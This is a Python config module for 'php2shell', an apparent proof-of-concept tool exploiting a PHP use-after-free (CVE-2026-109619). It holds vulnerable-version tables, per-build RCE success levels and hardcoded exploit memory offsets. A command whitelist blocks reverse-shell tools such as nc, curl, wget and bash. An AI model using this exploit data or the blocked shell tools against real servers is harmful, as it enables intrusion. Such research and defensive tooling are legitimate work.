"""config.py — konstanta, data CVE, tabel dukungan build, pagar perintah.

Satu sumber kebenaran untuk semua angka & tabel. Modul lain import dari sini,
jangan ada literal angka versi/fix-floor yang tercecer di file lain.
"""

from __future__ import annotations

import re
from dataclasses import dataclass

VERSION = "2.0.0"
TOOL_NAME = "php2shell"

# CVE yang rantai PoC-nya diimplementasikan penuh di lib/chain.py.
CVE_SUPPORTED = ("CVE-2026-109619",)
# Keluarga CVE; 109618 hanya diklasifikasi versinya (rantai beda, tidak dijalankan).
CVE_FAMILY = ("CVE-2026-109619", "CVE-2026-109618")

# --------------------------------------------------------------------------- #
# Fix-floor per branch PHP: versi pertama yang sudah diperbaiki.               #
# Di BAWAH angka ini = rentan. Dari angka ini ke atas = sudah patch.            #
# --------------------------------------------------------------------------- #
FIX_FLOOR: dict[str, str] = {
    "8.5": "8.5.12",
    "8.4": "8.4.27",
    "8.3": "8.3.36",
    "8.2": "8.2.35",
}
LAST_VULN: dict[str, str] = {
    "8.5": "8.5.11",
    "8.4": "8.4.26",
    "8.3": "8.3.35",
    "8.2": "8.2.34",
}

# PHP <= 8.1 sudah EOL: tanpa backport, rentan selamanya.
EOL_MAX_BRANCH = "8.1"


# --------------------------------------------------------------------------- #
# Tabel dukungan build (RCE / leak-saja / belum terbukti) per versi+arsitektur #
# Sumber: devploit/php2shell (13 profil heap), 9bie (worker pinning), lab.     #
# --------------------------------------------------------------------------- #
# level: "rce"  -> stage 1+2+3 terbukti, perintah dieksekusi
#        "leak" -> stage 1+2 terbukti, stage 3 tidak
#        "no"   -> belum pernah terbukti bisa dilanjutkan
@dataclass(frozen=True)
class BuildEntry:
    php: str
    arch: str
    level: str  # "rce" | "leak" | "no"
    note: str


BUILD_SUPPORT: tuple[BuildEntry, ...] = (
    BuildEntry("8.5.11", "amd64", "rce", "separate offsets, same htdata"),
    BuildEntry("8.5.11", "aarch64", "rce", "uid=33(www-data)"),
    BuildEntry("8.5.10", "aarch64", "rce", "uid=33(www-data)"),
    BuildEntry("8.4.26", "amd64", "rce", "reference lab build; RCE proven here"),
    BuildEntry("8.4.25", "aarch64", "rce", "stage 3 probabilistic - needs retry"),
    BuildEntry("8.5.0", "any", "leak", "stage-3 layout not found"),
    BuildEntry("8.3.35", "aarch64", "leak", "stage-3 reference alive, RCE not"),
    BuildEntry("8.3.33", "amd64", "leak", "wordpress:7.1.1-apache mod_php"),
    BuildEntry("8.3.0", "aarch64", "no", "PS(id) dangling; cookie not reclaimed"),
    BuildEntry("8.2.34", "aarch64", "no", "UAF present; different leak shape"),
    BuildEntry("8.1.34", "aarch64", "no", "UAF present; different leak shape"),
    BuildEntry("8.0.30", "aarch64", "no", "UAF present; different leak shape"),
    BuildEntry("7.4.33", "aarch64", "no", "UAF present; different leak shape"),
)


def lookup_build(php_version: str, arch: str = "any") -> BuildEntry | None:
    """Cari entri tabel untuk versi+arsitektur; kalau tak ada, cari versinya saja."""
    if not php_version:
        return None
    for e in BUILD_SUPPORT:
        if e.php == php_version and e.arch in (arch, "any"):
            return e
    for e in BUILD_SUPPORT:
        if e.php == php_version:
            return e
    return None


def support_level(php_version: str, arch: str = "any") -> str:
    """Kembalikan "rce"/"leak"/"no"/"?" untuk build yang diberikan."""
    e = lookup_build(php_version, arch)
    return e.level if e else "?"


# --------------------------------------------------------------------------- #
# Offset bawaan per profil exploit (dipakai bila auto-offset gagal).           #
# --------------------------------------------------------------------------- #
EXPLOIT_PROFILES: dict[str, dict[str, int]] = {
    # Image resmi php:8.4.26-apache (bookworm).
    "bookworm": {
        "zif_offset": 0x00000000006c4c20,
        "dtor_offset": 0x00000000004d25b0,
        "htdata_offset": 0x0000000000b8a080,
    },
    # Profil generik untuk image yang belum dikalibrasi.
    "lab": {
        "zif_offset": 0x00000000006c4c20,
        "dtor_offset": 0x00000000004d25b0,
        "htdata_offset": 0x0000000000b8a080,
    },
}
DEFAULT_EXPLOIT_PROFILE = "bookworm"

# --------------------------------------------------------------------------- #
# Pagar perintah (proof-of-access design). Ditegakkan di KODE, bukan di teks.  #
# --------------------------------------------------------------------------- #
MAX_CMD_BYTES = 14

# Perintah identitas yang diizinkan (whitelist). Lain = ditolak.
ALLOWED_IDENTITY_CMDS = frozenset({
    "id", "whoami", "uname", "hostname", "pwd", "date",
    "ls", "df", "cat", "uptime", "arch", "env", "free",
})

# Primitif shell yang DIBLOKIR permanen — tak bisa ditambah lewat flag apa pun.
BLOCKED_PRIMITIVES = frozenset({
    "bash", "sh", "zsh", "dash", "csh", "ksh", "fish",
    "nc", "ncat", "netcat", "socat",
    "curl", "wget", "python", "python3", "perl", "ruby", "php",
    "awk", "sed", "grep", "find", "xargs", "eval", "exec",
    "base64", "openssl", "ssh", "scp", "ftp", "telnet",
    "rm", "mkfs", "dd", "chmod", "chown", "sudo", "su",
})

# Operator shell yang dilarang dalam perintah proof.
BLOCKED_OPERATORS = frozenset({";", "&", "|", ">", "<", "`", "$", "\n", "\r",
                               "(", ")", "{", "}", "*", "?", "~"})

# Nama file bukti yang valid (untuk --proof-file).
PROOF_NAME_RE = re.compile(r"^[A-Za-z0-9_-]{1,24}$")


@dataclass(frozen=True)
class FenceVerdict:
    ok: bool
    reason_key: str = ""
    reason_kwargs: dict | None = None


def validate_command(cmd: str, extra_allow: tuple[str, ...] = ()) -> FenceVerdict:
    """Validasi perintah proof terhadap pagar. Mengembalikan FenceVerdict.

    Urutan pemeriksaan (fail-aman, cek termurah dulu):
      1. ukuran byte <= MAX_CMD_BYTES
      2. tidak ada operator shell terlarang
      3. token pertama bukan primitif shell terlarang
      4. token pertama ada di whitelist (ALLOWED_IDENTITY_CMDS + extra_allow)
    """
    cmd = (cmd or "").strip()
    if not cmd:
        return FenceVerdict(False, "fence.default_note")

    raw = cmd.encode("utf-8", errors="replace")
    if len(raw) > MAX_CMD_BYTES:
        return FenceVerdict(False, "fence.too_long",
                            {"n": len(raw), "max": MAX_CMD_BYTES})

    for ch in cmd:
        if ch in BLOCKED_OPERATORS:
            return FenceVerdict(False, "fence.blocked_char", {"ch": repr(ch)})

    first = cmd.split()[0] if cmd.split() else ""
    low = first.lower()
    if low in BLOCKED_PRIMITIVES:
        # Deteksi khusus reverse-shell agar pesannya spesifik.
        if low in ("bash", "sh", "nc", "ncat", "netcat", "python", "python3",
                   "perl", "ruby", "php"):
            return FenceVerdict(False, "fence.revshell_blocked")
        return FenceVerdict(False, "fence.not_whitelisted", {"cmd": first})

    allowed = ALLOWED_IDENTITY_CMDS | frozenset(extra_allow)
    if low not in allowed:
        return FenceVerdict(False, "fence.not_whitelisted", {"cmd": first})

    return FenceVerdict(True)


def build_command_preview(cmd: str, proof_file: str | None = None) -> str:
    """Susun perintah final: proof-file menghasilkan `cmd>/out/NAME`."""
    if proof_file:
        if not PROOF_NAME_RE.match(proof_file):
            raise ValueError(f"invalid proof-file name: {proof_file!r}")
        return f"{cmd}>/out/{proof_file}"
    return cmd
